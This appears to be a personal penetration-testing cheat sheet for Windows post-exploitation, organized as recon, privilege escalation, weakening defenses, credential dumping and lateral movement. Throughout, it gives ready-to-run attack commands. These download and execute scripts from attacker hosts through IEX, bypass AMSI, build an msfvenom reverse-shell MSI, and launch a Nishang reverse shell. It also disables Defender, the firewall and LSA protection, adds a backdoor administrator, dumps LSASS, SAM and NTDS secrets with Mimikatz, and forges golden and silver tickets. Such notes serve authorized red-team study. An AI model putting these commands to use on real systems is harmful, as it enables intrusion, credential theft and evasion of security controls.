### Initial Checks

    //##Migrate:
        execute -H -f notepad
        migrate <pid>           //or to Explorer if present

    whoami /all

    Check for AV:  
        wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
        powershell -c get-ciminstance -namespace root/SecurityCenter2 -ClassName AntivirusProduct

    Check for AppLocker rules:  
        powershell -c Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
        powershell -c "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
        //note your user, rules may not apply (especially if you exploited on)
        
    Check PS Execution Mode:  $ExecutionContext.SessionState.LanguageMode

    Check for LSA:  Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"

    Check for Credential Guard:  $DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard; if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}; if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}

    Check for proxies:
        //1:
            netsh winhttp show proxy
        //2:
            New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null; $keys = Get-ChildItem 'HKU:\'; ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}; (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer; Remove-PSDrive -Name HKU
        //3:
            [System.Net.WebProxy]::GetDefaultProxy()
        //Check if proxy will be used:  [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.45.158/runner.ps1")


    //General Recon:
        //check processes & netstat
        tasklist & netstat -anob | findstr /v UDP | findstr /v dns.exe |findstr /v obtain & ipconfig /all & qwinsta & net user & systeminfo & net use & net share & dir /od "c:\Program Files" & dir /od "c:\Program Files (x86)" & reg query HKCU\Software & reg query HKLM\Software
            tasklist
            netstat -anob
            ipconfig /all
            qwinsta
            net user
            net use & net share
            systeminfo
            dir /od "c:\Program Files" & dir /od "c:\Program Files (x86)"
            reg query HKCU\Software & reg query HKLM\Software
        //Domain/DC:
            net user /domain
            nslookup -type=any <domain>.
            nltest /domain_trusts
            //linux: dig <domain> any; dig @<DC>.<domain> <domain> axfr
            klist
            net view \\<ip>
        schtasks /query [/tn <name> /xml]
        //Check Desktop, Documents, Downloads
            dir /od c:\
            dir /od c:\users
            dir /od c:\Users\pete\Desktop & dir /od c:\Users\pete\Documents & dir /od c:\Users\pete\Downloads
            dir /od c:\Users\administrator\Desktop & dir /od c:\Users\administrator\Documents & dir /od c:\Users\administrator\Downloads
        wmic process get processid,commandline
        

    //###Hostrecon.ps1:
        (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
        (new-object system.net.webclient).downloadstring('http://192.168.49.121/HostRecon.ps1') | IEX
        Invoke-HostRecon > Hrecon.txt
        Invoke-HostRecon -Portscan -TopPorts 100            //check firewall outbound; can edit script to scan my IP

    //###Seatbelt.exe:
        //can directly run Seatbelt.exe if no AV
        //More Stealthy:
            (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
            (new-object system.net.webclient).downloadstring('http://192.168.49.121/PowerSharpPack.ps1') | IEX
            PowerSharpPack -seatbelt -Command "-group=all" > seat.txt

    //###Check Event Logs:
        Get-EventLog -List
        Get-EventLog -LogName "NAME" | where {$_.Message -like '*CUSTOM*'} | select Message | format-table -wrap     


### Privilege Escalation

    //Privileges:
        whoami /all
        **SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege? (Network Service account, LocalService account, and default IIS account) - PrintSpoofer
            SeLoadDriverPrivilege privesc (https://0xdf.gitlab.io/2020/10/31/htb-fuse.html)

    //Meterpreter:
        getsystem
        use post/multi/recon/local_exploit_suggester
        #use exploit/windows/local/bypassuac_injection_winsxs   

    //###SharpUp:
        //transfer info.xml and payload.txt (SharpUp.cs)
        copy C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe test.exe
        test.exe info.xml results.xml  

    //###PowerUp.ps1:
        (new-object system.net.webclient).downloadstring('http://192.168.49.121/amsi.txt') | IEX
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath Pup.txt
        ex. if AlwaysInstallElevated is set:
                cmd.exe /c 'systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"'
                msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
                IWR -Uri http://172.16.1.30/evil.msi -OutFile evil.msi
    //Service Hijack Example:
            # Exploit vulnerable service permissions (does not require touching disk)
                Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAIN\user /add"
            # Exploit an unquoted service path vulnerability to spawn a beacon
                Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'
            # Restart the service to exploit (not always required)
                net.exe stop VulnerableSvc && net.exe start VulnerableSvc
        //DLL Hijack Example:
            (New-Object System.Net.WebClient).DownloadString('http://%IP%/amsi.txt') | IEX
            (New-Object System.Net.WebClient).DownloadString('http://%IP%/PowerUp.ps1') | IEX
            Write-HijackDll -OutputFile 'C:\Users\ted\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command 'calc.exe'
            shutdown /r /t 0 /f
            
    //*##Manual Service Hijacking Example:
        cmd /c sc config SNMPTRAP binPath= "cmd.exe /c ping -n 2 192.168.49.121"
        cmd /c sc config SNMPTRAP binPath= "cmd.exe /c c:\windows\tasks\Hollow.exe"
        cmd /c sc config SNMPTRAP start= demand
        //might need:
            cmd /c sc failure SNMPTRAP reset= 999999 actions= ""
            cmd /c sc config SNMPTRAP obj= LocalSystem
            cmd /c sc config SNMPTRAP type= own type= interact
        cmd /c sc start SNMPTRAP


    //###WinPEAS:
        //allow color:  REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
        (new-object system.net.webclient).downloadstring('http://192.168.45.158/amsi.txt') | IEX
        //.exe:  
            $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://192.168.45.158/winpeas.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("domain wait")
        //.ps1:
            powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.45.158/winpeas.ps1')

    //Crassus.exe - boot log analyzer

    //WES.py:  python3 wes.py systeminfo.txt
    
    //MSSQL Servers?
        //In my domain (prod.corp1.com):  setspn -T prod -Q MSSQLSvc/*
        //In my forest (corp1.com):  setspn -T corp1 -Q MSSQLSvc/*
        //In another forest (corp2.com):  setspn -T corp2 -Q MSSQLSvc/*
        -privesc via linked server RCE
        -privesc/lateral movement via hash disclosure - crack or relay
        SQL.exe
        SQLSMBHash.exe
        SQLRecon.exe
        //Link crawling w/ MSF: use exploit/windows/mssql/mssql_linkcrawler


### Weakening

    //Allow Anonymous SMB Access:
        reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
        (https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default)
        //If GPO:  reg add HKLM\Software\Policies\Microsoft\Windows\LanmanWorkstation\AllowInsecureGuestAuth /t REG_DWORD /d 1 /f

    //Disable Firewall:
        netsh advfirewall set currentprofile state off

    //Disable Defender:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/DisableDefender.ps1') | IEX
            # Remove Windows Defender definitions
            & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
            # Disable Windows Defender real-time monitoring
            Set-MpPreference -DisableRealtimeMonitoring $true
        //Or: c:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All

    //Create New User & Enable RDP:
        (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/CreateAdmin.ps1') | IEX
            # Create new administrator
            net user bob abc123! /add
            net localgroup administrators bob /add
            # Enable RDP if it's currently disabled
            $RDP = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
            if ($RDP.fDenyTSConnections -eq 1) {
                Write-Output "Enabling Remote Desktop..."
                Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
                netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
                Write-Output "Remote Desktop is now enabled."
            } else {
                Write-Output "Remote Desktop is already enabled."
            }
    
### Dump Credentials

    Autologon Key:  reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"

    Check for Tokens:
        //Meterpreter:
            load incognito / use incognito
            help incognito
            list_tokens -u
            impersonate_token corp1\\admin
            drop_token
        //Works if a domain user is logged in; otherwise you can either...
            -Dump NTLM hash from LSASS (may require disabling LSA)
            -Migrate into the user's process (after getting backup SYSTEM shell first)

    Check for GPP Files:
        IEX(New-Object Net.Webclient).DownloadString('http://192.168.49.121/Get-GPPPassword.ps1')
        //Metasploit:  post/windows/gather/credentials/gpp
        //Decrypt a cpassword:  gpp-decrypt <cpassword>

    Check for LAPS Creds:
        //Metasploit:  use post/windows/gather/credentials/enum_laps
        //IEX(New-Object Net.Webclient).DownloadString('http://192.168.49.121/LAPSToolkit.ps1')
            //Import-Module .\LAPSToolkit.ps1
            Get-LAPSComputers               //might show blank pw if not allowed
            Find-AdmPwdExtendedRights
            Find-LAPSDelegatedGroups        //see what groups are allowed to view it
                //Check group members w/ PowerView.ps1:  Get-NetGroupMember -Identity "LAPS Password Readers" -Recurse
                    ***target these users!

    Local Creds (SAM, etc.):
        //Locally:
            //Meterpreter: hashdump // load kiwi; lsa_dump_secrets; lsa_dump_sam
                post/windows/gather/lsa_secrets
            //Invoke-Mimikatz.ps1:
                (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
                (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz10.ps1') | IEX
                Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log out.txt" "lsadump::sam" "sekurlsa::logonPasswords full" "sekurlsa::credman" "exit"'
                # Dump Windows secrets, such as stored creds for scheduled tasks:
                    vault::list
                    vault::cred /patch
        //Remotely:
            secretsdump.py test.local/john:password123@10.10.10.1
                w/ hash:  secretsdump.py WORKGROUP/Administrator@10.1.1.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
            //MSF:  use auxiliary/scanner/smb/impacket/secretsdump; set rhosts 192.168.1.108; set smbuser administrator; set smbpass Ignite@987; exploit


    Domain Creds (cached locally):
        //address LSA if enabled
        //Enable WDigest:  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
        //Meterpreter:
            load kiwi; creds_all
            Or:  lsa_dump_secrets; lsa_dump_sam
            load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest" 
        //To Disable LSA:
            //Method 1:
                reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
                \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /installDriver
                \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /disableLSAProtection
                <perform dump>
                \\192.168.45.210\visualstudio\PPLKiller\x64\Release\PPLKiller.exe /uninstallDriver
            //Method 2:
                (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/DisableLSA.ps1') | IEX
        //Remote Dump:
            lsassy [-d domain] -u pixis -p P4ssw0rd targets
            lsassy [-d domain] -u pixis -H [LM:]NT targets
        //Local Dump:
            rundll32.exe \\192.168.45.215\visualstudio\Dumpert\Dumpert-DLL\x64\Release\Outflank-Dumpert-DLL.dll,Dump
                //download from c:\windows\temp
            //Decode:
                pypykatz lsa minidump /tmp/lsa/lsa.txt
            //Invoke-Mimikatz.ps1:
                (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
                (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz.ps1') | IEX
                Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log out.txt" "sekurlsa::logonPasswords full" "sekurlsa::credman" "SEKURLSA::Kerberos" "SEKURLSA::Krbtgt" "SEKURLSA::SSP" "SEKURLSA::Wdigest" "exit"'

    Domain Creds (locally on DC):
        //DCSync:
            //dump any user's hash
            //Windows:
                (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
                (New-Object System.Net.WebClient).DownloadString('http://192.168.45.210/Invoke-Mimikatz10.ps1') | IEX
                Invoke-Mimikatz -Command '"lsadump::dcsync /domain:megacorp.local /user:MEGACORP\krbtgt" "exit"'
                Invoke-Mimikatz -Command '"lsadump::dcsync /domain:megacorp.local /user:MEGACORP\administrator" "exit"'
                Invoke-DCSync -GetComputers -Domain megacorp.local -DomainController DC1.megacorp.local
            //Linux:
                secretsdump.py MEGACORP/snovvcrash:'Passw0rd!'@DC1.megacorp.local -dc-ip 192.168.1.11 -just-dc-user 'MEGACORP\krbtgt'
                secretsdump.py DC1.megacorp.local -dc-ip 192.168.1.11 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
        //NTDS.dit:
            //Recon:
                //MSF:  use post/windows/gather/ntds_location; set session 1; exploit
            //Dump & Parse:
                //Local:
                    fgdump.exe
                    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
                    NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM

                //Remote:
                    //CME:
                        crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi
                    //MSF:
                        use auxiliary/scanner/smb/impacket/secretsdump; set rhosts 192.168.1.108; set smbuser administrator; set smbpass Ignite@987; exploit
            //Dump:
                //MSF:
                    use post/windows/gather/ntds_grabber; set session 1; exploit
                    cabextract <cab filename>
            //Parse:
                secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL

            //Crack:
                john --format=NT hash

    //Cached Creds (must crack):
        reg query "HKLM\Software\Microsoft\Windows NT\Current Version\Winlogon"
        //MSF:  post/windows/gather/cachedump
        ./john cache.txt -w=wordlist.txt --format=mscash2 --external:AutoStatus
        ./hashcat64.bin -a 0 -m 2100 /home/hash.txt /home/wordlist.txt -w 3 

    //Putty:
        reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
        reg query "HKEY_USERS\<SID>\Software\SimonTatham\PuTTY\Sessions" /s

    //WinSCP:
        reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
        reg query "HKEY_USERS\<SID>\Software\Martin Prikryl\WinSCP 2\Sessions" /s
        for /f "tokens=*" %a in ('reg query "HKEY_USERS" ^| findstr /r "S-1-5-.*"') do @reg query "%a\Software\Martin Prikryl\WinSCP 2\Sessions" /s
        Get-ChildItem -Path "HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions\" -Recurse

    //Full Find:
        dir /b /a /s c:\ > cdirs.txt
        type cdirs.txt | findstr /i passw
        type cdirs.txt | findstr /i unattend
        type cdirs.txt | findstr /i panther
        type cdirs.txt | findstr /i sysprep
        type cdirs.txt | findstr /i web.config
        type cdirs.txt | findstr /i vnc.ini

    //Other:
        reg query HKLM /f password /t REG_SZ /s
        reg query HKCU /f password /t REG_SZ /s
        cmdkey /list
        reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

    //Monitor Creds:
        //Start RDP Creds Monitor if users are connecting out:
            //upload RdpThief.dll to C:\Windows\Tasks and run RdpThiefInjector.exe - watch for creds in C:\Users\<you>\AppData\Local\Temp\6\data.bin

    //Monitor Clipboard:
        load extapi
        clipboard_monitor_start
        clipboard_set_text "TEST"
        clipboard_get_data
        clipboard_monitor_dump
        clipboard_monitor_stop

### Domain
- **See DOMAIN SURVEY page**

### Lateral Movement

    //Domain Lateral Movement:
        //Overpass-the-hash:
            # Request a TGT as the target user and pass it into the current session
            # NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
                .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
            # More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
                .\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt
            # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
                .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
            # Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
                sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe
            //Mimikatz (riskier):
                sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

        # Golden ticket (domain admin, w/ some ticket properties to avoid detection)
        kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

        # Silver ticket for a specific SPN with a compromised service / machine account
        kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

    //LATERAL MOVEMENT:
        //Service SPN Access Methods:  HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights) 
        //Check interfaces, routing, and firewall
            ipconfig /all
            route print
            nmap ...
            ping ...
        //MSSQL Servers?
            //In my domain (prod.corp1.com):  setspn -T prod -Q MSSQLSvc/*
            //In my forest (corp1.com):  setspn -T corp1 -Q MSSQLSvc/*
            //In another forest (corp2.com):  setspn -T corp2 -Q MSSQLSvc/*
            -privesc via linked server RCE
            -privesc/lateral movement via hash disclosure - crack or relay
        //RDP:
            //Enable Restricted Admin:
                sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
                Enter-PSSession -Computer appsrv01
                New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
                //Or:  cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
            //Connect via PTH:
                //Mimikatz:  privilege::debug; sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
                //xfreerdp:   xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
            //SharpRDP w/ Creds:
                sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.215/msf.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
        //Fileless/RPC (445/CIFS access - w/o creds):
            **Disable Defender before shell:
                \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "cmd.exe /c c:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"
            **Best Shell Method - copy and execute Hollower/Injector:
                copy \\192.168.45.158\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\file01\c$\windows\tasks
                \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "C:\windows\tasks\Hollow.exe"
                ****Bypass:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\SharpSCExec.csproj
                    //replace the arguments within the file
                    //w/ payload:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\Windows\Tasks\HollowUAC.csproj
            *Or enable and run via SMB:
                \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "cmd.exe /c netsh advfirewall set currentprofile state off"
                \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f"
                \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "\\192.168.45.158\visualstudio\Injector\NtProcessInjector\bin\x64\Release\NtProcessInjector.exe explorer"
            //PTH Method:
                python scshell.py MEGACORP/snovvcrash@192.168.1.11 -hashes :fc525c9683e8fe067095ba2ddc971889 -service-name lfsvc
                SCShell>C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://10.10.13.37:8080/payload.ps1')
        //WMIC RCE method (w/ creds):
            copy \\192.168.45.158\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\file01\c$\Windows\Temp
            wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Hollow.exe"
        //WMI & MSBuild Method:
            https://github.com/pwn1sher/WMEye
        //Evil-WinRM:
            evil-winrm -i 10.10.10.169 -P 5985 -u melanie -p 'Welcome123!'
                ls -force
            //test creds:  crackmapexec winrm 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'

    //Tunneling:
        //Metasploit Reverse Socks Proxy:
            //useful if NAT is enabled
            use multi/manage/autoroute; set session 1; exploit
                //Or:  run autoroute -s 192.168.77.0/24
                //Manually:  route add 169.254.0.0 255.255.0.0 1
                //Confirm:  route print; route get 169.254.204.110
            use auxiliary/server/socks_proxy; set srvhost 127.0.0.1; exploit -j         //to stop: jobs; kill 0
                //Or:  use auxiliary/server/socks4a
            //edit /etc/proxychains4.conf
            proxychains rdesktop 192.168.120.10
        //Chisel Reverse Socks Proxy:
            //##Build .exe:  env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
            //Start server on kali
                /home/kali/data/chisel/chisel server -p 8000 --reverse
            //Transfer and run Client on Windows:
                upload /home/kali/data/chisel/chisel.exe c:\\Users\\Administrator\\Desktop
                //Socks Method:  chisel.exe client 192.168.45.215:8000 R:socks
                //Local tunnel Method:  chisel client 192.168.45.215:8000 R:33890:10.10.10.240:3389 R:5985:192.168.122.132:5985
            //Same thing for Linux:
                ./chisel client 192.168.45.215:8000 R:socks
        //Ligolo Tunneling:
            ...

    //Credential Spraying:
        //Get Users:
            ex. GetADUsers.py MEGACORP/snovvcrash:'Passw0rd!' -all -dc-ip 192.168.1.11 | tee ~/ws/log/GetADUsers.out
        //CrackMapExec:
            //check local and domain - detects local auth or domain automatically, but to specify a different domain for auth:  -d domain
            --continue-on-success to check all combos
            --local-auth for local auth on a domain box
            -p for pass, -H for hash
            //Local Auth:
                proxychains -q crackmapexec smb 172.16.177.0/24 -u 'Administrator' -H /tmp/hashes.txt --local-auth
            //SMB: proxychains -q crackmapexec smb 172.16.177.254 -u /tmp/users.txt -H /tmp/hashes.txt
            //Winrm:  proxychains -q crackmapexec winrm 172.16.177.254 -u /tmp/users.txt -H /tmp/hashes.txt
            //RDP:  proxychains -q crackmapexec rdp 172.16.177.254 -u /tmp/users.txt -p /tmp/pass.txt
            //MSSQL:  crackmapexec mssql hosts.txt  -u $user -p $pass
            //Kerberos:
                export KRB5CCNAME=...
                //add DChostname to /etc/hosts
                proxychains -q crackmapexec smb 172.16.177.0/24 -k --use-kcache --kdcHost <DChostname>
        //RCE:
            -x switch to execute commands from cmd.exe or the -X switch to perform commands using PowerShell
            ex. -x "ping -n 2 192.168.49.121"
            //Reverse Shell example w/ Nishang:
                //add to bottom of Invoke-PowerShellTcp.ps1:  Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.30 -Port 443
                crackmapexec smb 172.16.1.200 -u administrator -H 3542d79d5d17bc9d3014d4d56b5e3060 --local-auth -X "iex(new-object net.webclient).downloadstring('http://172.16.1.30/Invoke-PowerShellTcp443.ps1')"
        //MSF - SMB (w/ password):
            use auxiliary/scanner/smb/smb_login
            set RHOSTS <DC_IP>
            set SMBDomain megacorp.local
            set SMBPass Passw0rd!
            set USER_FILE /home/snovvcrash/ws/enum/all-users.txt
            set VERBOSE False
            run
        //MSF - WinRM (w/ password):
            use auxiliary/scanner/winrm/winrm_login
            set rhosts 192.168.1.105
            set user_file /root/user.txt
            set pass_file /root/pass.txt
            set stop_on_success true
            exploit